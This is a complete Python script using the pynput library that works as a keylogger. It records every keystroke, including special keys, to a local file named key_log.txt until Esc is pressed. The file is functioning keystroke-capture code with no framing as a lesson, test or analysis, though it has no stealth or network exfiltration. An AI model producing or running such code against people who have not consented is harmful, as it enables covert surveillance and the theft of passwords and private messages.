from pynput.keyboard import Key, Listener

# File to store the keystrokes
log_file = "key_log.txt"

def on_press(key):
    try:
        # Convert key to string and store in log file
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys (e.g., space, enter, shift)
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("\t")
            else:
                f.write(f"[{key.name}]")

def on_release(key):
    # Stop the keylogger when 'esc' is pressed
    if key == Key.esc:
        return False

# Listener for capturing key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
